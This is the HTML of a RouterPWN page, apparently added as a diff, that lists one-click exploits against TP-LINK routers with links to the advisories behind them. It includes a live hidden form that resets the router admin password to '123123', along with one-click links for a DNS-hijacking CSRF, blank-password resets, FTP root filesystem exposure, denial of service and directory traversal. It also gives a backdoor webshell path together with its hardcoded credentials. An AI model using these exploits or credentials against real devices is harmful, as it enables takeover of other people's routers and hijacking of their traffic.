@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - TP-LINK - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ </head>
+ <body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+        <ul class="nav">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Free tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="tplink">
+       <h1>
+        TP-LINK
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+         <form action="http://192.168.1.1/Forms/tools_admin_1" id="WR1043ND" method="post" name="WR1043ND">
+          <input name="uiViewTools_Password" type="hidden" value="123123"/>
+          <input name="uiViewTools_PasswordConfirm" type="hidden" value="123123"/>
+         </form>
+         <tr>
+          <td>
+           01/14/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://1337day.com/exploit/21601">
+            1337day.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:td8840t_resetauth()">
+            TD-8840T - Reset Password to Blank
+           </a>
+           <a href="javascript:td8840t_resetauth(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           30/10/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.jakoblell.com/blog/2013/10/30/real-world-csrf-attack-hijacks-dns-server-configuration-of-tp-link-routers-2/">
+            www.jakoblell.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wr1043nd_dnscsrf()">
+            TP-Link WR1043ND - Change DNS CSRF
+           </a>
+           <a href="javascript:wr1043nd_dnscsrf(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/06/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.WR1043ND.submit();">
+            WR1043ND denial of service
+           </a>
+           <a href="javascript:setip('/...')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/06/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:WR1043ND()">
+            WR1043ND enable root filsystem on FTP CSRF
+           </a>
+           <a href="javascript:WR1043ND(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           04/06/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.youtube.com/watch?v=8xJGkRQB0QM">
+            www.youtube.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/Forms/tools_admin_1">
+            TD-8817 TD-W8901G blank admin password CSRF
+           </a>
+           <a href="javascript:setip('/Forms/tools_admin_1');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/26/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.websec.mx/advisories/view/tplink-wdr740-path-traversal">
+            www.websec.mx
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wdr740_dirtraversal()">
+            TP-Link WDR740ND/WDR740N - Directory Traversal
+           </a>
+           <a href="javascript:wdr740_dirtraversal(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           05/26/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.websec.mx/advisories/view/puerta-trasera-tplink-wdr740">
+            www.websec.mx
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/userRpmNatDebugRpm26525557/linux_cmdline.html">
+            Webshell backdoor (user: osteam password: 5up)
+           </a>
+           <a href="javascript:setip('/userRpmNatDebugRpm26525557/linux_cmdline.html');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
